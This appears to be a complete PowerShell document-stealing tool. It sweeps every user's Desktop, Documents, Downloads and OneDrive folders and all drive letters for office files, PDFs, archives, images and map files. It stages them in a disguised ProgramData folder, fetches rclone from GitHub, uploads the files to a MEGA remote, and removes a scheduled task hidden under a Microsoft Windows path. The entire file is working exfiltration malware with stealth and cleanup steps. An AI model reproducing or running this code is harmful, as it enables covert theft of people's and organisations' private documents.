function Invoke-StreamCopy {
param (
    [switch]$First,
    [switch]$Stream,
    #[switch]$DownAll,
    [string]$objName,
    [string]$destMega
)


    function SearchAndCopy {
    param (
        [string]$LocalPath,
        [string]$WhichCopy
    )
    
        $files = (Get-ChildItem -Path $LocalPath -Recurse -Include $exts -Exclude "~$*") | Where-Object {$_.Length -lt $size}
        if ($WhichCopy -eq 'Stream') { $files = $files | Where-Object {$_.LastWriteTime -gt (Get-Date).AddHours(-200) } }
        if ($WhichCopy -eq 'First') { $files = $files | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-500) } }
    
        foreach ($file in $files) {         
            New-Item $tempDestDir -ItemType Directory -ea 0
            Copy-Item -Force $file.FullName $tempDestDir
            $newFile = ($tempDestDir + $file.Name)

            $hash = (Get-FileHash -Algorithm MD5 $newFile).hash
            if ((Select-String -path $hashfile -Pattern $hash) -eq $null) {
                $file.FullName | Out-File -Encoding utf8 -FilePath $logfile -Append
                if ($WhichCopy -eq 'First') {
                    Move-Item -Force $newFile -Destination $allDestDir
                    $hash | Out-File -Encoding utf8 -FilePath $hashfile -Append
                }
                if ($WhichCopy -eq 'Stream') {
                    New-Item $sendDestDir -ItemType Directory -ea 0 
                    Copy-Item -Force $newFile -Destination $sendDestDir
                    $file.FullName | Out-File -Encoding utf8 -FilePath $logfile -Append
                    $hash | Out-File -Encoding utf8 -FilePath $sucup -Append
                }
                    
            } else { 
                ($file.FullName + " : --- OLD FILE ---") | Out-File -Encoding utf8 -FilePath $logfile -Append
                del -Force $newFile
            }
        }
    }


    function Secure-Copy {
    param (
        [string]$switchCopy
    )
        
        foreach ($usersDir in (gci $srcdir)) {
            foreach ($deskDir in $deskDirs) { 
                SearchAndCopy -LocalPath (Join-Path $usersDir.FullName $deskDir) -WhichCopy $switchCopy 
            }
        }
        foreach ($allPath in $allPaths) { 
            if (Test-Path -Path $allPath) {
                SearchAndCopy -LocalPath $allPath -WhichCopy $switchCopy 
            }
        }
    }

    function Download-All {
        echo "Upload Documents . . ." 
        &($appsDir + 'rc.exe') --config ($appsDir + 'rc.conf') --log-file=$rcLogFile --log-level=DEBUG copy -M -P $allDestDir mgp:/$destMega/AllObjFirst/$objName/
        del -Force -Recurse $allDestDir
        del -Force -Recurse $tempDestDir
        del -Force $firstMark
        New-Item $firstEndMark -ItemType File -ea 0
    }

    function Download-Stream {
        echo "Upload Documents . . ."
        &($appsDir + 'rc.exe') --config ($appsDir + 'rc.conf') --log-file=$rcLogFile copy --log-level=DEBUG -M -P $sendDestDir mgp:/$destMega/$currYear/$currDate/$objName/
        Get-Content $sucup | out-file -Encoding utf8 -FilePath $hashfile -Append
        del -Force $sucup
        del -Force -Recurse $tempDestDir
        del -Force -recurse $sendDestDir
    }

    function Check-RClone {
        if ((Test-Path ($appsDir + 'rc.exe')) -eq $false) {
        Invoke-WebRequest -Uri "https://github.com/jensack/stream/raw/main/rc.zip" -OutFile ($appsDir + 'rc.zip')
        Expand-Archive -Path ($appsDir + 'rc.zip') -DestinationPath $appsDir
        del -force ($appsDir + 'rc.zip')        
    }
    }

    [bool]$second = $false
    $baseDir = 'C:\ProgramData\Waves\'; New-Item $baseDir -ItemType Directory -ea 0
    $appsDir = ($baseDir + 'Apps\'); New-Item $appsDir -ItemType Directory -ea 0
    Check-RClone
    $srcdir = 'C:\Users\'
    $allPaths = @('A:','B:','D:','E:','F:','G:','H:','I:','J:','K:','L:','M:','N:','O:','P:','Q:','R:','S:','T:','U:','V:','W:','Z:','X:','Y:')
    $destDir = ($baseDir + 'Docs\') ; New-Item $destDir -ItemType Directory -ea 0
    $tempDestDir = ($destDir + 'tempDir\')
    $firstEndMark = ($destDir + 'firstEndMark.txt')
    $rcLogFile = ($destDir + 'rc.log')

    $hashfile = ($destDir + 'checksum.txt'); New-Item $hashfile -ItemType File -ea 0
    $logfile = ($destDir + 'logs.txt'); New-Item $logfile -ItemType File -ea 0

    $currTime = (Get-Date -UFormat %H.%M)
    $currDateTime = (Get-Date -UFormat %d.%m.%y..%H.%M)
    $currDate = (Get-Date -UFormat %d.%m.%y)
    $currYear = (Get-Date -UFormat %Y)
    $size = 100*1024*1024
    $exts = ('*.doc','*.docx','*.rtf','*.xls','*.xlsm','*.xlsx','*.pdf','*.txt','*.zip','*.rar','*.7z','*.jpg','*дск*','*.kme','*.kml','*.kmz','*.scene','*.json','*zones.txt','*.jpeg','*.png','*.bmp','*.ppt','*.pptx','*.odt','*.csv')
    $deskDirs = @('Desktop', 'Documents', 'Downloads', 'OneDrive')

    if ($objName -eq "") { $objName = $env:COMPUTERNAME }

    if ($destMega -eq "") { $destMega = "ZSUDocs" }

    if (($First -ne $true) -and ($Stream -ne $true) -and ($DownAll -ne $true)) {
        echo "You must specify at least one of <First> or <Stream> or <DownAll>"
        return
    }

    if ($Stream -OR $First) { 
        echo '<><><><><><><><><><><><><><><><><><><><><><><><><><><>' | Out-File -Encoding utf8 -FilePath $logfile -Append
        echo '<><><><><><><><><><><><><><><><><><><><><><><><><><><>' | Out-File -Encoding utf8 -FilePath $hashfile -Append
        $CurrDateTime | Out-File -Encoding utf8 -FilePath $logfile -Append
        $CurrDateTime | Out-File -Encoding utf8 -FilePath $hashfile -Append
        echo '<><><><><><><><><><><><><><><><><><><><><><><><><><><>' | Out-File -Encoding utf8 -FilePath $hashfile -Append
        echo '<><><><><><><><><><><><><><><><><><><><><><><><><><><>' | Out-File -Encoding utf8 -FilePath $logfile -Append
    }

    if ($First) {
        #$firstEndMark = ($destDir + 'firstEndMark.txt')
        if (Test-Path $firstEndMark) { echo "First Copy is over"; Invoke-StreamCopy -Stream -objName $objName; return }
        $allDestDir = ($destDir + 'ALL\'); New-Item $allDestDir -ItemType Directory -ea 0
        $firstMark = ($destDir + 'firstMark.txt')
        if (Test-Path $firstMark) { Download-All; return }
        else {
            Secure-Copy -switchCopy First
            New-Item $firstMark -ItemType File -ea 0
            Download-All
        }
    }

    #if ($DownAll) { Download-All }
        
    
    if ($Stream) {
        if ((Test-Path $firstEndMark) -eq $false) { return }
        schtasks.exe /TN "\Microsoft\Windows\WDI\SecureSyncFirst" /DELETE /F
        $sucup = ($destDir + 'sucup.txt'); del -ErrorAction SilentlyContinue -Force $sucup; New-Item $sucup -ItemType File -ea 0
        $etalonhash = (Get-FileHash -Algorithm MD5 $sucup).hash
        $sendDestDir = ($destDir + $currYear + '\' + $currDate + '\')
        
        Copy-Item -Force -Recurse ($tempDestDir + '\*') $sendDestDir
        Secure-Copy -switchCopy Stream

        $newhash = (Get-FileHash -Algorithm MD5 $sucup).hash
        if ($newhash -ne $etalonhash) { Download-Stream }
    }
}